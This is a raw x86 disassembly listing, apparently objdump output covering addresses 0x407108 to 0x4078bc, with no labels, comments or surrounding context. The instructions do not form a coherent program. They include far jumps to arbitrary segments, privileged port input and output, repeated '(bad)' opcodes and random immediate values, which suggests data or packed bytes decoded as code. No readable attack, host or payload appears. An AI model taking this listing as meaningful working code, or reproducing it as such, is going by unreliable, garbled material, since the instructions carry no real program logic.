  407108:	in     al,dx
  407109:	pushf  
  40710a:	mov    esp,0x6a0345e4
  40710f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407110:	test   BYTE PTR [ebp-0x3b488240],0x66
  407117:	push   es
  407118:	xor    al,0x65
  40711a:	jmp    0xfee1:0x3a275ea0
  407121:	cmp    eax,0x679fc25d
  407126:	push   ebx
  407127:	xor    ebx,edi
  407129:	mov    eax,0xedaf3bd0
  40712e:	in     eax,0x71
  407130:	add    ebp,DWORD PTR [ecx-0x7f73d8f7]
  407136:	aas    
  407137:	push   edi
  407138:	das    
  407139:	xchg   esp,eax
  40713a:	or     al,0xb3
  40713c:	xor    DWORD PTR [ebx],edi
  40713e:	fwait
  40713f:	jae    0x4070c9
  407141:	xor    edi,DWORD PTR [esi-0x7ad3b506]
  407147:	mov    ebx,0x58ae3978
  40714c:	jge    0x407131
  40714e:	lds    ecx,FWORD PTR [esi+0x7f]
  407151:	jg     0x40715c
  407153:	dec    esp
  407154:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407155:	inc    esi
  407156:	sbb    ebp,0x9d90d90e
  40715c:	(bad)  
  40715d:	sar    bl,0xd7
  407160:	jo     0x4071bb
  407162:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407163:	fidivr DWORD PTR [edx-0x16]
  407166:	push   eax
  407167:	jecxz  0x407121
  407169:	imul   DWORD PTR [ecx-0x13fe569d]
  40716f:	lea    eax,[ebp+0x6a]
  407172:	shl    BYTE PTR [ecx+ebx*8],1
  407175:	push   esp
  407176:	jb     0x407129
  407178:	pop    ss
  407179:	mov    bl,0xb2
  40717b:	mov    ds:0xae4782f7,eax
  407180:	pop    edx
  407181:	test   BYTE PTR [ecx+0x4f97322d],dl
  407187:	in     eax,dx
  407188:	add    al,0x98
  40718a:	or     al,0xc9
  40718c:	add    BYTE PTR [ebx],ch
  40718e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40718f:	pop    ds
  407190:	aas    
  407191:	ss imul esp,ecx,0x5a9911af
  407198:	pop    es
  407199:	or     dl,cl
  40719b:	daa    
  40719c:	dec    ecx
  40719d:	je     0x407204
  40719f:	dec    ebx
  4071a0:	stos   DWORD PTR es:[edi],eax
  4071a1:	mov    esp,0xd1de66df
  4071a6:	cmp    ebx,DWORD PTR es:[edx+0x135d41ea]
  4071ad:	xor    esp,DWORD PTR [eax+0x195d8e26]
  4071b3:	aam    0xfa
  4071b5:	in     al,0xef
  4071b7:	fsubrp st(7),st
  4071b9:	add    cl,BYTE PTR [ebp-0x7c]
  4071bc:	xlat   BYTE PTR ds:[ebx]
  4071bd:	adc    dl,BYTE PTR [edi+0x2b38dee1]
  4071c3:	jbe    0x40719e
  4071c5:	outs   dx,BYTE PTR ds:[esi]
  4071c6:	xlat   BYTE PTR ds:[ebx]
  4071c7:	pop    edi
  4071c8:	in     eax,dx
  4071c9:	dec    esp
  4071ca:	js     0x407228
  4071cc:	pop    esp
  4071cd:	pushf  
  4071ce:	mov    dl,0xac
  4071d0:	and    BYTE PTR [ecx],0xe0
  4071d3:	jle    0x407253
  4071d5:	nop
  4071d6:	imul   edi,DWORD PTR [eax],0xffffff8d
  4071d9:	sbb    BYTE PTR [edi+0x66],ah
  4071dc:	or     al,0x2a
  4071de:	jmp    0xc63b886c
  4071e3:	mov    ds:0x9b6748f2,eax
  4071e8:	hlt    
  4071e9:	jae    0x40722c
  4071eb:	rol    DWORD PTR [esi],0x71
  4071ee:	inc    ebp
  4071ef:	mov    al,ds:0xa22a18e6
  4071f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071f5:	(bad)  
  4071f6:	loopne 0x407221
  4071f8:	mov    bh,0xc0
  4071fa:	in     eax,0x57
  4071fc:	pmaxub mm0,mm6
  4071ff:	fld    QWORD PTR [ecx-0x64afd3b5]
  407205:	outs   dx,DWORD PTR ds:[esi]
  407206:	cwde   
  407207:	jle    0x4071a0
  407209:	and    eax,0xf06dda4d
  40720e:	mov    DWORD PTR [edx-0x14],ebp
  407211:	mov    ebp,0xcf510e70
  407216:	jle    0x4071c3
  407218:	sbb    eax,DWORD PTR [edx-0x3012781a]
  40721e:	jmp    0xdb54:0x50c5e4f
  407225:	mov    ch,0x11
  407227:	push   esi
  407228:	inc    edi
  407229:	pop    eax
  40722a:	or     edx,DWORD PTR [esi]
  40722c:	inc    ecx
  40722d:	mov    eax,0x7284026
  407232:	leave  
  407233:	in     eax,dx
  407234:	dec    esi
  407235:	shr    DWORD PTR [ebp+0x72ea3aad],cl
  40723b:	push   0x30
  40723d:	or     esi,DWORD PTR [ecx-0x4b2055ab]
  407243:	scas   al,BYTE PTR es:[edi]
  407244:	cld    
  407245:	rcl    DWORD PTR [ecx+0x7c],1
  407248:	pop    ebp
  407249:	mov    dh,0xc4
  40724b:	cli    
  40724c:	retf   0xf898
  40724f:	cmp    edx,DWORD PTR [esi+0x4999e46]
  407255:	stos   BYTE PTR es:[edi],al
  407256:	mov    cl,0x6b
  407258:	jns    0x40720c
  40725a:	jge    0x4072bb
  40725c:	push   edx
  40725d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40725e:	xchg   DWORD PTR [ebx+0x48bbd7c1],ecx
  407264:	fnstsw WORD PTR [edx-0xb0ec5d3]
  40726a:	lea    eax,[ebx]
  40726c:	push   ss
  40726d:	stos   BYTE PTR es:[edi],al
  40726e:	jmp    0x26a7d1b5
  407273:	mov    ah,0x6f
  407275:	pushf  
  407276:	adc    BYTE PTR [esi],cl
  407278:	xor    DWORD PTR [edi],esp
  40727a:	pushf  
  40727b:	or     edi,ecx
  40727d:	fbld   TBYTE PTR [ebp-0x3e666e26]
  407283:	mov    edi,0xeae0c950
  407288:	lods   al,BYTE PTR ds:[esi]
  407289:	scas   eax,DWORD PTR es:[edi]
  40728a:	ss add al,0xaa
  40728d:	aam    0x6
  40728f:	cli    
  407290:	jl     0x40728b
  407292:	jb     0x407248
  407294:	and    BYTE PTR [eax-0x59265a8f],bl
  40729a:	int    0x97
  40729c:	jnp    0x407317
  40729e:	push   edi
  40729f:	sbb    bh,al
  4072a1:	dec    edi
  4072a2:	and    dh,BYTE PTR ds:0x71b00ecf
  4072a8:	(bad)  
  4072a9:	xlat   BYTE PTR ds:[ebx]
  4072aa:	xchg   BYTE PTR [eax],ah
  4072ac:	xor    eax,0x1cff6c39
  4072b1:	mov    ds:0x8759c1a7,eax
  4072b6:	rcr    DWORD PTR [esi+0x42],cl
  4072b9:	std    
  4072ba:	inc    esp
  4072bb:	xchg   edi,eax
  4072bc:	adc    eax,0x7bc57422
  4072c1:	push   ebp
  4072c2:	les    ebp,FWORD PTR [edx]
  4072c4:	pop    ecx
  4072c5:	loop   0x4072b8
  4072c7:	mov    ds:0xb279bec6,al
  4072cc:	add    al,0x8f
  4072ce:	xchg   DWORD PTR [ecx],edi
  4072d0:	mov    cl,0x19
  4072d2:	(bad)  
  4072d3:	outs   dx,BYTE PTR ds:[esi]
  4072d4:	inc    edi
  4072d5:	ja     0x40726f
  4072d7:	inc    esi
  4072d8:	bound  esp,QWORD PTR [eax+0x16ffc9df]
  4072de:	lods   eax,DWORD PTR ds:[esi]
  4072df:	and    ebx,ebp
  4072e1:	ds inc ebx
  4072e3:	sbb    edx,DWORD PTR [ebp+0x2]
  4072e6:	or     DWORD PTR ds:0xd2ce91dd,edi
  4072ec:	mov    esi,0x21c16c1f
  4072f1:	xchg   esp,eax
  4072f2:	push   ebx
  4072f3:	clc    
  4072f4:	mov    DWORD PTR [edi-0x7eff0e2f],esp
  4072fa:	shl    BYTE PTR [edi+0x650c7c70],cl
  407300:	mov    ds:0xb01c396e,al
  407305:	inc    ecx
  407306:	nop
  407307:	leave  
  407308:	sbb    eax,0x89241d32
  40730d:	sub    cl,BYTE PTR [ebp+0x6bb7fed9]
  407313:	(bad)  
  407314:	iret   
  407315:	jg     0x4072a5
  407317:	out    0x27,eax
  407319:	add    al,0x37
  40731b:	mov    eax,esi
  40731d:	adc    BYTE PTR [ebp-0x2b],0x75
  407321:	in     al,dx
  407322:	dec    ecx
  407323:	dec    esi
  407324:	push   esi
  407325:	int    0xaa
  407327:	sbb    BYTE PTR [edi+edx*4],0x1a
  40732b:	sbb    BYTE PTR [esi+0x3e780ac],dh
  407331:	jmp    0x9a32c631
  407336:	emms   
  407338:	scas   al,BYTE PTR es:[edi]
  407339:	les    edi,FWORD PTR [ebx-0x4fa17c09]
  40733f:	lock das 
  407341:	pop    ss
  407342:	fst    QWORD PTR [edi]
  407344:	aas    
  407345:	push   esp
  407346:	jl     0x4073b9
  407348:	test   eax,0x124fa6a4
  40734d:	pop    ecx
  40734e:	and    esp,0x5
  407351:	ins    DWORD PTR es:[edi],dx
  407352:	ror    al,cl
  407354:	stos   DWORD PTR es:[edi],eax
  407355:	push   0xf510b0cb
  40735a:	ins    DWORD PTR es:[edi],dx
  40735b:	sub    edi,0xffffffe0
  40735e:	outs   dx,BYTE PTR ds:[esi]
  40735f:	stos   DWORD PTR es:[edi],eax
  407360:	inc    esp
  407361:	cmp    edx,esi
  407363:	or     al,0x3e
  407365:	ds and eax,0x50906512
  40736b:	shr    BYTE PTR [edx+0x2],1
  40736e:	jno    0x407381
  407370:	push   ebx
  407371:	inc    esp
  407372:	push   es
  407373:	adc    DWORD PTR ds:0xb2b403b7,ebx
  407379:	inc    ebx
  40737a:	pop    ebp
  40737b:	jge    0x407396
  40737d:	mov    ebx,0x2f21c41b
  407382:	sar    edx,cl
  407384:	pop    eax
  407385:	mov    DWORD PTR [ebx+0x12c608a4],esp
  40738b:	sahf   
  40738c:	sub    DWORD PTR [ebx],ecx
  40738e:	cdq    
  40738f:	inc    ebx
  407390:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407391:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407392:	mov    ecx,0x117425d6
  407397:	push   eax
  407398:	adc    ebx,ecx
  40739a:	jge    0x4073ed
  40739c:	xor    al,0x91
  40739e:	push   esi
  40739f:	mov    ebp,0x9a490d06
  4073a4:	cmp    edx,esp
  4073a6:	pop    edx
  4073a7:	dec    ecx
  4073a8:	nop
  4073a9:	dec    esi
  4073aa:	dec    ebp
  4073ab:	sub    BYTE PTR [edi],cl
  4073ad:	ja     0x407375
  4073af:	cmp    esi,esi
  4073b1:	dec    ebx
  4073b2:	jmp    0xc94d:0xd7d52688
  4073b9:	sti    
  4073ba:	ss call 0xa86a39d5
  4073c0:	push   cs
  4073c1:	and    ebp,ecx
  4073c3:	xchg   esi,eax
  4073c4:	lahf   
  4073c5:	adc    edx,ebp
  4073c7:	hlt    
  4073c8:	stos   DWORD PTR es:[edi],eax
  4073c9:	inc    esp
  4073ca:	xchg   ch,bh
  4073cc:	sti    
  4073cd:	jne    0x4073b6
  4073cf:	dec    ecx
  4073d0:	pop    es
  4073d1:	ret    
  4073d2:	rol    cl,1
  4073d4:	sbb    bl,BYTE PTR ds:0x2bc2e6dc
  4073da:	inc    eax
  4073db:	push   ecx
  4073dc:	dec    esp
  4073de:	dec    ebp
  4073df:	imul   ebx,DWORD PTR [esi-0x7ffe164f],0x7545ca75
  4073e9:	push   ebp
  4073ea:	and    al,bh
  4073ec:	jg     0x40745a
  4073ee:	xchg   esp,eax
  4073ef:	fisttp WORD PTR [edx-0x3a]
  4073f2:	push   ss
  4073f3:	daa    
  4073f4:	pop    edx
  4073f5:	push   ss
  4073f6:	neg    DWORD PTR [esi+0x600a7e87]
  4073fc:	leave  
  4073fd:	(bad)  
  4073fe:	cmp    DWORD PTR [edi-0x4d],ebp
  407401:	outs   dx,DWORD PTR ds:[esi]
  407402:	out    0x9,al
  407404:	retf   0x7724
  407407:	test   al,0xb5
  407409:	gs lock dec edi
  40740c:	dec    ebx
  40740d:	and    eax,0xc08a86d
  407412:	or     DWORD PTR [esi-0x5d],ebp
  407415:	mov    cl,0x2c
  407417:	(bad)  
  407419:	pop    eax
  40741a:	sbb    al,0x81
  40741c:	ret    0xba09
  40741f:	add    ebx,DWORD PTR [eax]
  407421:	repz push es
  407423:	jecxz  0x407435
  407425:	add    ch,BYTE PTR [ecx-0x59ebcb7f]
  40742b:	or     cl,0x39
  40742e:	mov    ah,0xea
  407430:	les    esp,FWORD PTR [esi-0x3c]
  407433:	cmc    
  407434:	cmp    BYTE PTR [ebx],ch
  407436:	gs (bad) 
  407438:	out    dx,eax
  407439:	sub    al,0xb6
  40743b:	cwde   
  40743c:	outs   dx,BYTE PTR ds:[esi]
  40743d:	sti    
  40743e:	inc    edi
  40743f:	mov    edx,0xf283409e
  407444:	sbb    eax,ecx
  407446:	dec    ecx
  407447:	jmp    0x93f7416f
  40744c:	shr    BYTE PTR [ecx+eax*1+0x67],0xa
  407451:	lds    edx,FWORD PTR [edx-0x3e]
  407454:	sbb    dl,bl
  407456:	lods   al,BYTE PTR ds:[esi]
  407457:	stos   DWORD PTR es:[edi],eax
  407458:	addr16 mov al,0x63
  40745b:	sar    DWORD PTR [ebx],0x2
  40745e:	pop    ecx
  40745f:	xchg   BYTE PTR ss:[ecx+0x39],bl
  407463:	cmc    
  407464:	arpl   bx,ax
  407466:	inc    edx
  407467:	jp     0x407486
  407469:	popf   
  40746a:	loop   0x4073ff
  40746c:	repz sbb cl,0xb9
  407470:	inc    esp
  407471:	not    ebp
  407473:	or     DWORD PTR ds:0x86f222e,ebx
  407479:	shl    cl,1
  40747b:	jb     0xc2d562e6
  407481:	inc    DWORD PTR [edx-0x4a]
  407484:	inc    eax
  407485:	(bad)  
  407487:	and    edi,DWORD PTR [edi-0x4d2f3683]
  40748d:	sub    eax,esi
  40748f:	jge    0x4074ea
  407491:	adc    DWORD PTR [ebp+edi*1+0x65],0xffffffcd
  407496:	and    BYTE PTR [ebx+0x23893c12],0x9b
  40749d:	dec    eax
  40749e:	out    dx,al
  40749f:	fnstenv [edi]
  4074a1:	sub    al,0xec
  4074a3:	js     0x407506
  4074a5:	jmp    0x4074a6
  4074a7:	mov    bh,0x89
  4074a9:	dec    esi
  4074aa:	lods   al,BYTE PTR ds:[esi]
  4074ab:	sub    ecx,DWORD PTR [ebx+eiz*1-0x196c7e95]
  4074b2:	mov    WORD PTR [edx],es
  4074b4:	push   es
  4074b5:	stc    
  4074b6:	hlt    
  4074b7:	xchg   esp,eax
  4074b8:	add    al,0x6f
  4074ba:	mov    dh,0x4a
  4074bc:	mov    esp,0x7930404b
  4074c1:	ins    DWORD PTR es:[edi],dx
  4074c2:	add    dh,al
  4074c4:	and    BYTE PTR [eax+0x7a0726c6],ch
  4074ca:	mov    esi,0xe00e8ef8
  4074cf:	xor    al,0xd7
  4074d1:	sti    
  4074d2:	push   ebx
  4074d3:	ss sub al,0xf3
  4074d6:	add    BYTE PTR [edi+0x305f9ea9],cl
  4074dc:	inc    esp
  4074dd:	sar    BYTE PTR [esi+0x6c],cl
  4074e0:	inc    eax
  4074e1:	or     BYTE PTR [eax-0x330fd6ea],0xbc
  4074e8:	mov    esi,DWORD PTR [ecx+0x2d4c700a]
  4074ee:	das    
  4074ef:	push   es
  4074f0:	leave  
  4074f1:	out    0xd,al
  4074f3:	popa   
  4074f4:	iret   
  4074f5:	shr    BYTE PTR [ecx],0xcd
  4074f8:	push   esp
  4074f9:	inc    BYTE PTR [edi-0x33]
  4074fc:	push   ss
  4074fd:	inc    esp
  4074fe:	mov    BYTE PTR [edx+0x62dc00af],bh
  407504:	test   al,0x1c
  407506:	test   ah,0xb5
  407509:	jmp    0x35550508
  40750e:	(bad)  
  40750f:	mov    cl,0xc0
  407511:	mov    ebx,0x423dcf4b
  407516:	adc    cl,dh
  407518:	aam    0xb4
  40751a:	push   eax
  40751b:	pop    ecx
  40751c:	ja     0x407590
  40751e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40751f:	loopne 0x407595
  407521:	fdiv   DWORD PTR [ecx-0x7d]
  407524:	jbe    0x407527
  407526:	retf   
  407527:	sub    al,0x83
  407529:	fisttp QWORD PTR ss:[eax]
  40752c:	adc    DWORD PTR [ebx-0x11],ebp
  40752f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407530:	jae    0x407566
  407532:	push   esi
  407533:	push   edi
  407534:	push   ds
  407535:	mov    edx,0x8e88d9c9
  40753a:	icebp  
  40753b:	mov    ah,0x20
  40753d:	ja     0x407513
  40753f:	pushf  
  407540:	dec    esi
  407541:	pop    es
  407542:	add    esi,ecx
  407544:	mov    ecx,0x104f42b5
  407549:	xchg   esi,eax
  40754a:	dec    ebx
  40754b:	cmp    DWORD PTR [ecx],edi
  40754d:	mov    ah,0x82
  40754f:	fild   DWORD PTR [eax-0x7866fcd7]
  407555:	aad    0x86
  407557:	push   ss
  407558:	xchg   ecx,eax
  407559:	and    BYTE PTR cs:[edx-0x14da34bf],cl
  407560:	pop    esi
  407561:	push   ss
  407562:	inc    edi
  407563:	jge    0x407544
  407565:	push   edx
  407566:	jo     0x4075ac
  407568:	xchg   ecx,eax
  407569:	inc    ebp
  40756a:	cwde   
  40756b:	cmp    esp,ecx
  40756d:	pop    ecx
  40756e:	xchg   edi,eax
  40756f:	xchg   ebp,eax
  407570:	pop    ebx
  407571:	sahf   
  407572:	je     0x4074f9
  407574:	inc    esp
  407575:	mov    esi,0x8ca9df7f
  40757a:	mov    fs,WORD PTR [edx]
  40757c:	mov    dh,bh
  40757e:	fcomip st,st(2)
  407580:	jecxz  0x4075e1
  407582:	inc    esi
  407583:	arpl   WORD PTR [edi],cx
  407585:	cmp    BYTE PTR [edx],cl
  407587:	and    al,0x87
  407589:	adc    BYTE PTR [ecx-0x47],cl
  40758c:	ja     0x4075ac
  40758e:	dec    ebx
  40758f:	mov    ch,0x8f
  407591:	jmp    0xd8c5:0x7201d648
  407598:	xchg   BYTE PTR [edx],dl
  40759a:	sbb    edx,eax
  40759c:	in     eax,dx
  40759d:	into   
  40759e:	jbe    0x40755f
  4075a0:	adc    al,0xc9
  4075a2:	lods   al,BYTE PTR ds:[esi]
  4075a3:	and    DWORD PTR [edx+0x2f46553],0x1b354d93
  4075ad:	jmp    0x616e0b1a
  4075b2:	push   edi
  4075b3:	push   es
  4075b4:	or     esp,edx
  4075b6:	or     al,0xb4
  4075b8:	mul    BYTE PTR [esi+0x563ceb3f]
  4075be:	xor    ebp,edi
  4075c0:	adc    BYTE PTR [ebx-0x67],ch
  4075c3:	rcl    BYTE PTR [edx-0x53d0568c],0xb9
  4075ca:	mov    ebp,0x6862a513
  4075cf:	cmc    
  4075d0:	test   eax,0x872f16bf
  4075d5:	xchg   ebx,eax
  4075d6:	repz push esp
  4075d8:	or     eax,0xa17a5e7b
  4075dd:	ja     0x407564
  4075df:	jne    0x407565
  4075e1:	or     dh,BYTE PTR [edi]
  4075e3:	jb     0x4075e4
  4075e5:	add    ah,BYTE PTR [edx]
  4075e7:	fldenv [esi]
  4075e9:	loop   0x407622
  4075eb:	leave  
  4075ec:	call   0xbf12bc9e
  4075f1:	cmp    ecx,DWORD PTR [ebp+0x4d]
  4075f4:	xchg   edx,eax
  4075f5:	outs   dx,DWORD PTR ds:[esi]
  4075f6:	add    cl,bh
  4075f8:	out    0xe8,al
  4075fa:	adc    edi,DWORD PTR [esi]
  4075fc:	add    eax,0x9faf4e05
  407601:	mov    dh,0x58
  407603:	(bad)  
  407604:	xor    al,BYTE PTR [edi+0x43]
  407607:	inc    edx
  407608:	fcmovbe st,st(4)
  40760a:	into   
  40760b:	retf   0xc44a
  40760e:	sub    eax,0x521d8040
  407613:	jo     0x407674
  407615:	push   ds
  407616:	nop
  407617:	push   ecx
  407618:	mov    edx,0x4a2c034e
  40761d:	(bad)
  407620:	fsub   QWORD PTR [eax+0x5e]
  407623:	sub    DWORD PTR [eax+0x73],ebp
  407626:	repnz dec esp
  407628:	cmc    
  407629:	mov    DWORD PTR ds:0x96c1465d,edx
  40762f:	fs ja  0x4075dd
  407632:	mov    bh,0x8f
  407634:	out    dx,eax
  407635:	dec    ecx
  407636:	mov    ebp,0x3c658a45
  40763b:	pop    ecx
  40763c:	jl     0x40766d
  40763e:	in     al,dx
  40763f:	pop    esi
  407640:	test   BYTE PTR [eax+ebx*1-0x67c4b434],cl
  407647:	dec    esi
  407648:	pop    edx
  407649:	inc    ebx
  40764a:	cdq    
  40764b:	inc    ebp
  40764c:	loopne 0x4075f6
  40764e:	cmp    ebp,DWORD PTR [edx+0x75]
  407651:	int    0xac
  407653:	xor    DWORD PTR [ebx+0x48],ebx
  407656:	ror    ebx,cl
  407658:	and    dl,BYTE PTR [esi-0x27d6ca85]
  40765e:	jl     0x4076d5
  407660:	retf   0x20b1
  407663:	xor    BYTE PTR [ebp-0x5287c979],cl
  407669:	imul   edx,DWORD PTR [ecx-0x7ff5df7],0x5dae1470
  407673:	daa    
  407674:	jg     0x4076b8
  407676:	ficomp WORD PTR [ebx]
  407678:	aam    0xd8
  40767a:	aad    0xc1
  40767c:	jne    0x40762d
  40767e:	push   edx
  40767f:	pop    eax
  407680:	jbe    0x4076e6
  407682:	xor    cl,BYTE PTR [edi-0x7]
  407685:	mov    esi,0x7b238d13
  40768a:	cmp    al,BYTE PTR ds:0xb7605e7a
  407690:	mov    al,0x5b
  407692:	addr16 add eax,0x67b0236a
  407698:	retf   0x5ed8
  40769b:	xor    ebx,eax
  40769d:	and    DWORD PTR [ebp-0x2f],eax
  4076a0:	loop   0x407689
  4076a2:	test   eax,0xf2a7b586
  4076a7:	inc    eax
  4076a8:	adc    BYTE PTR [ebx+0x634d4b87],al
  4076ae:	fdivr  DWORD PTR [ebx]
  4076b0:	inc    esp
  4076b1:	neg    esi
  4076b3:	dec    ebx
  4076b4:	cwde   
  4076b5:	test   DWORD PTR [edi+eiz*1-0x40e02145],edx
  4076bc:	sub    DWORD PTR [edi-0x4dc40a4a],ebx
  4076c2:	leavew 
  4076c4:	inc    esp
  4076c5:	xchg   BYTE PTR [ecx],dl
  4076c7:	ret    0xede
  4076ca:	mov    dh,0xa6
  4076cc:	and    eax,DWORD PTR [ecx]
  4076ce:	sar    ebp,0x6b
  4076d1:	mov    al,0x9
  4076d3:	mov    ecx,0xe7e0bc99
  4076d8:	xchg   esp,eax
  4076d9:	adc    BYTE PTR [edx-0x25],0xda
  4076dd:	sbb    DWORD PTR [ebp+0x40],ecx
  4076e0:	mov    eax,ds:0x3fbee992
  4076e5:	or     BYTE PTR [esi],ch
  4076e7:	ins    DWORD PTR es:[edi],dx
  4076e8:	xchg   esi,eax
  4076e9:	outs   dx,BYTE PTR ds:[esi]
  4076ea:	mov    ebp,0xd7eef9b5
  4076ef:	cmp    esi,DWORD PTR [eax-0x3766f763]
  4076f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076f6:	imul   esp,DWORD PTR [edi+edi*4],0xfffffffa
  4076fa:	dec    edx
  4076fb:	pop    esp
  4076fc:	inc    ebx
  4076fd:	adc    ah,BYTE PTR [eax]
  4076ff:	cdq    
  407700:	or     eax,0x2b5c8ab7
  407705:	push   cs
  407706:	sub    eax,0xfa69a01a
  40770b:	pop    ecx
  40770c:	(bad)  
  40770d:	xlat   BYTE PTR ds:[ebx]
  40770e:	and    BYTE PTR [edi-0x68],cl
  407711:	adc    ch,BYTE PTR [edx-0x80]
  407714:	cmp    al,0xfa
  407716:	mov    al,ds:0x2dac6c80
  40771b:	xchg   dx,ax
  40771d:	mov    esp,0xb288276
  407722:	call   0x3cf3:0xa12937a8
  407729:	and    eax,0x20112e97
  40772e:	(bad)  
  40772f:	std    
  407730:	test   al,0x7d
  407732:	sbb    eax,esi
  407734:	inc    edx
  407735:	pop    edi
  407736:	push   ebx
  407737:	daa    
  407738:	sbb    eax,0xf059abe7
  40773d:	sub    al,0x1
  40773f:	ss int3 
  407741:	inc    esp
  407742:	pusha  
  407743:	cld    
  407744:	in     eax,0x63
  407746:	lds    ecx,FWORD PTR [ecx+0x9]
  407749:	cwde   
  40774a:	(bad)  
  40774c:	enter  0x9530,0x23
  407750:	ret    0x1e84
  407753:	pushf  
  407754:	outs   dx,BYTE PTR ds:[esi]
  407755:	add    al,0x71
  407757:	jge    0x40777d
  407759:	pop    es
  40775a:	retf   
  40775b:	adc    BYTE PTR [eax-0x6c847bda],0x7c
  407762:	push   edi
  407763:	jmp    0x40777a
  407765:	loopne 0x4077c3
  407767:	xchg   DWORD PTR [esi],esi
  407769:	mov    cl,0x24
  40776b:	in     eax,0xc6
  40776d:	xchg   BYTE PTR [ebp+0x15],al
  407770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407771:	clc    
  407772:	push   cs
  407773:	ret    
  407774:	mov    ecx,DWORD PTR [edx+edi*4-0x6ef25d49]
  40777b:	cmp    ecx,DWORD PTR [esi-0x25]
  40777e:	test   ebx,ecx
  407780:	fmul   QWORD PTR [ebp+ebp*4+0x8]
  407784:	addr16 inc edi
  407786:	stc    
  407787:	mov    ch,0x8b
  407789:	mov    edi,DWORD PTR [ecx+0x6b61952d]
  40778f:	popa   
  407790:	dec    edx
  407791:	mov    edx,0x69245b9f
  407796:	rcl    edi,cl
  407798:	cmp    BYTE PTR [eax+0x4d346b6b],dh
  40779e:	mov    ebp,0x6bfc7ba2
  4077a3:	push   ebp
  4077a4:	and    dh,BYTE PTR [ebx-0x71]
  4077a7:	add    cl,0xa9
  4077aa:	cmp    esi,DWORD PTR [edi-0x74acbe0b]
  4077b0:	and    BYTE PTR [esi+0x3c],0xc0
  4077b4:	jp     0x40777e
  4077b6:	sbb    al,dh
  4077b8:	inc    ebx
  4077b9:	adc    dl,BYTE PTR [edi+edx*4-0x3723e07c]
  4077c0:	sar    BYTE PTR [eax],1
  4077c2:	pop    ss
  4077c3:	dec    esi
  4077c4:	loop   0x407832
  4077c6:	cld    
  4077c7:	(bad)  
  4077c9:	(bad)  
  4077cb:	jbe    0x407819
  4077cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077ce:	xor    al,0x7f
  4077d0:	dec    ecx
  4077d1:	hlt    
  4077d2:	jns    0x4077b6
  4077d4:	cmp    DWORD PTR [ebp-0x56c0d2b2],eax
  4077da:	sub    dh,BYTE PTR [edi]
  4077dc:	jmp    0xd4fa:0xac34cd7d
  4077e3:	inc    edi
  4077e4:	mov    al,0x4b
  4077e6:	stc    
  4077e7:	inc    eax
  4077e8:	pop    esp
  4077e9:	ins    BYTE PTR es:[edi],dx
  4077ea:	std    
  4077eb:	in     al,0xb4
  4077ed:	in     eax,0x4c
  4077ef:	call   0x8ad0:0xd36addb2
  4077f6:	add    BYTE PTR [ecx-0x211dcb22],0x28
  4077fd:	sub    BYTE PTR [esi+ecx*4-0x1b],ch
  407801:	jecxz  0x4077c6
  407803:	sub    dh,BYTE PTR [ecx]
  407805:	loop   0x40786a
  407807:	mov    ecx,0x215ea20
  40780c:	pusha  
  40780d:	cmp    eax,0x68e42c82
  407812:	cld    
  407813:	push   esp
  407814:	or     edx,DWORD PTR [esi-0x2]
  407817:	jle    0x4077d5
  407819:	xchg   ecx,eax
  40781a:	pop    edi
  40781b:	push   edi
  40781c:	jge    0x4077e9
  40781e:	jbe    0x407880
  407820:	scas   al,BYTE PTR es:[edi]
  407821:	in     eax,0x42
  407823:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  407825:	push   es
  407826:	cmc    
  407827:	pop    esp
  407828:	push   ebx
  407829:	(bad)  
  40782a:	out    dx,al
  40782b:	cmp    ecx,ecx
  40782d:	mov    ?,WORD PTR [esi]
  40782f:	mov    WORD PTR [eax],es
  407831:	icebp  
  407832:	sbb    DWORD PTR [edx+0x38937113],edi
  407838:	adc    al,0xc7
  40783a:	repnz leave 
  40783c:	scas   al,BYTE PTR es:[edi]
  40783d:	hlt    
  40783e:	pop    edi
  40783f:	or     dl,BYTE PTR [esi-0x41]
  407842:	sub    al,0x77
  407844:	push   edi
  407845:	xor    eax,0xda95e2ef
  40784a:	dec    esi
  40784b:	adc    eax,0x815f929b
  407850:	lods   al,BYTE PTR ds:[esi]
  407851:	popa   
  407852:	lds    ecx,FWORD PTR es:[ebx-0x38]
  407856:	push   eax
  407857:	push   cs
  407858:	ss cwde 
  40785a:	lahf   
  40785b:	fdivr  DWORD PTR [ebx+edx*8]
  40785e:	ins    BYTE PTR es:[edi],dx
  40785f:	(bad)
  407863:	mov    eax,DWORD PTR [edx-0x5e]
  407866:	outs   dx,DWORD PTR ds:[esi]
  407867:	push   edi
  407868:	pushf  
  407869:	outs   dx,DWORD PTR ds:[esi]
  40786a:	add    eax,0xb1c59e6e
  40786f:	shr    DWORD PTR [ebx+0x5b],1
  407872:	jg     0x4078a8
  407874:	add    DWORD PTR fs:[ecx-0x2a],esp
  407878:	pop    es
  407879:	repnz rol BYTE PTR [ebx],1
  40787c:	inc    edi
  40787d:	jmp    0x407882
  40787f:	mov    ss,edi
  407881:	repnz mov esp,0x4e677989
  407887:	jns    0x40780f
  407889:	push   es
  40788a:	int    0x8e
  40788c:	jae    0x40785a
  40788e:	fs js  0x40784b
  407891:	pop    ss
  407892:	xor    bl,bl
  407894:	pop    ecx
  407895:	dec    ebp
  407896:	push   0xffffffe5
  407898:	lahf   
  407899:	scas   eax,DWORD PTR es:[edi]
  40789a:	pop    ebx
  40789b:	or     esi,DWORD PTR [ebx]
  40789d:	call   0x4336:0x45154d90
  4078a4:	pop    esi
  4078a5:	es pop es
  4078a7:	jge    0x4078c3
  4078a9:	pusha  
  4078aa:	out    dx,al
  4078ab:	popf   
  4078ac:	and    ebx,0x6275aa84
  4078b2:	mov    ebx,0xbbebda79
  4078b7:	in     al,dx
  4078b8:	xchg   esp,eax
  4078b9:	xchg   BYTE PTR [ecx+0x3e],al
  4078bc:	stc    
